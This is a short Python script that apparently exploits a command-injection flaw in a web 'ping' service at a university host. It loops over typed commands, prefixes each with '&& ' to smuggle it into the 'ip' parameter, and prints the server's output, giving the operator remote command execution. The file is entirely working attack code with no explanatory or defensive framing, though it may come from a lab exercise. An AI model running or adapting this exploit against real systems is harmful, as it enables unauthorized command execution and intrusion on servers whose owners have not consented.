import requests
import urllib

url = "http://aau.dk:5000/ping"

#test connection to the host
req = requests.get(url)
print("Host is up!!")

while True:
    cmd = raw_input("Enter command: ")
    # execute another command, bypass ping!
    cmd = "&& "+cmd

    #supply the command and PWN
    try:        
        req = requests.get(url, params={"ip": cmd})
        print(req.text)
    except:
        print("Could not exec command..")
